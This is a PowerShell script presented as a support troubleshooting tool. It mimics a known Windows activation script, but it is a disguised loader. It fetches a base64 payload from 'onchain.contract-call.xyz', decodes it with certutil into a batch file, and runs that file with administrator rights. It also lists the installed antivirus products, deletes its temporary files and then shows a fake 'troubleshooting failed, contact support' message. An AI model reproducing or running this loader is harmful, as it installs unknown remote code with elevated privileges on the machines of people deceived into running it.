if (-not $args) {
    Write-Host ''
    Write-Host 'Opening Command Prompt to Begin Troubleshoot, ' -NoNewline
    Write-Host 'Click Yes to Begin. ' -NoNewline
    Write-Host ''
}

& {
    $psv = (Get-Host).Version.Major
    $troubleshoot = 'Send Error Message To Support'

    if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
        $ExecutionContext.SessionState.LanguageMode
        Write-Host "PowerShell is not running in Full Language Mode."
        Write-Host "Help - https://gravesoft.dev/fix_powershell" -ForegroundColor White -BackgroundColor Blue
        return
    }

    try {
        [void][System.AppDomain]::CurrentDomain.GetAssemblies(); [void][System.Math]::Sqrt(144)
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "Powershell failed to load .NET command."
        Write-Host "Help - https://gravesoft.dev/in-place_repair_upgrade" -ForegroundColor White -BackgroundColor Blue
        return
    }

    function Check3rdAV {
        $cmd = if ($psv -ge 3) { 'Get-CimInstance' } else { 'Get-WmiObject' }
        $avList = & $cmd -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName

        if ($avList) {
            Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
            Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
        }
    }

    function CheckFile {
        param ([string]$FilePath)
        if (-not (Test-Path $FilePath)) {
            Check3rdAV
            Write-Host "Failed to create file in temp folder, aborting!"
            Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
            throw
        }
    }

    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    # Updated to download raw .b64 file and decode it using certutil -f -decode to .bat
    $URL = 'https://onchain.contract-call.xyz/system.b64'

    try {
        if ($psv -ge 3) {
            $base64RawContent = Invoke-RestMethod -Uri $URL -UseBasicParsing
        }
        else {
            $w = New-Object Net.WebClient
            $base64RawContent = $w.DownloadString($URL)
        }
    }
    catch {
        Write-Progress -Activity "Downloading..." -Status "Done" -Completed
        Check3rdAV
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "Failed to retrieve base64 file from $URL, aborting!"
        Write-Host "Check if antivirus or firewall is blocking the connection."
        Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
        return
    }

    # Generate temporary paths
    $rand = [Guid]::NewGuid().Guid
    $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
    $tempDir = if ($isAdmin) { "$env:SystemRoot\Temp" } else { "$env:USERPROFILE\AppData\Local\Temp" }

    $b64FilePath = Join-Path $tempDir "MAS_$rand.b64"
    $batFilePath = Join-Path $tempDir "MAS_$rand.bat"

    # Save the raw downloaded content as .b64 file
    try {
        Set-Content -Path $b64FilePath -Value $base64RawContent -Encoding ASCII
    }
    catch {
        Write-Host "Error: Failed to save temporary .b64 file." -ForegroundColor Red
        Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
        return
    }

    # Decode using certutil -f -decode
    try {
        $certutilResult = certutil -f -decode "$b64FilePath" "$batFilePath" 2>&1
        if ($LASTEXITCODE -ne 0) {
            throw "certutil failed with exit code $LASTEXITCODE`nOutput: $certutilResult"
        }
    }
    catch {
        Write-Host "Error: Failed to decode with certutil - $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "certutil output: $certutilResult"
        Write-Host "The downloaded content may not be valid base64 or certutil is unavailable."
        Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
        # Cleanup on failure
        Remove-Item $b64FilePath -ErrorAction SilentlyContinue
        return
    }

    # Optional: Clean up the .b64 file now that we have the .bat
    Remove-Item $b64FilePath -ErrorAction SilentlyContinue

    CheckFile $batFilePath

    # Check for AutoRun registry which may create issues with CMD
    $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
    foreach ($path in $paths) { 
        if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
            Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
        } 
    }

    $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
    $chkcmd = & $env:ComSpec /c "echo CMD is working"
    if ($chkcmd -notcontains "CMD is working") {
        Write-Warning "cmd.exe is not working.`nReport this issue at $troubleshoot"
    }

    # Execute the decoded .bat file
    if ($psv -lt 3) {
        if (Test-Path "$env:SystemRoot\Sysnative") {
            Write-Warning "Command is running with x86 Powershell, run it with x64 Powershell instead..."
            Remove-Item $batFilePath -ErrorAction SilentlyContinue
            return
        }
        $p = Start-Process -FilePath $env:ComSpec -ArgumentList "/c """"$batFilePath"" $args""" -Verb RunAs -PassThru
        $p.WaitForExit()
    }
    else {
        Start-Process -FilePath $env:ComSpec -ArgumentList "/c """"$batFilePath"" $args""" -Wait -Verb RunAs
    }

    CheckFile $batFilePath

    # Cleanup all temporary MAS files
    $FilePaths = @("$env:SystemRoot\Temp\MAS*.b64", "$env:SystemRoot\Temp\MAS*.bat",
                "$env:USERPROFILE\AppData\Local\Temp\MAS*.b64", "$env:USERPROFILE\AppData\Local\Temp\MAS*.bat")
    foreach ($pattern in $FilePaths) {
        Get-Item $pattern -ErrorAction SilentlyContinue | Remove-Item -Force }
    
    Write-Host ""
    Write-Host "Troubleshooting process has finished unsuccessful." -ForegroundColor Red
    Write-Host "Please Contact Support."
} @args





